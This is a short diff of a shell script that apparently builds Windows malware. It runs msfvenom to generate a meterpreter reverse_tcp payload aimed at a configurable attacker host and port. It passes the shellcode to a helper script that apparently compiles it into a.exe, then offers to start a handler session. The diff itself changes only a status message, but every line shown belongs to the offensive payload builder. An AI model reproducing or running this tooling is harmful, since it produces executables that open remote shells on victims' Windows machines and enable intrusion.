@@ -46,7 +46,7 @@ sleep 5
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$host lport=$port -f raw -o she3ll.bin > /dev/null 2>&1
 printf "\n\033[1;37mPayload Generated"
 python3 help.py she3ll.bin > /dev/null 2>&1
-printf "\n\n\033[1;30ma.exe \033[0;31mGenerated And Compiled Successfully In Outptut Folder"
+printf "\n\n\033[1;30ma.exe \033[0;31mGenerated And Compiled Successfully"
 printf "\n\n\033[1;33mCreate Multi Handler Session For you ! \n\n"
 if [[ -e she3ll.bin ]];then
 rm -rf she3ll.bin
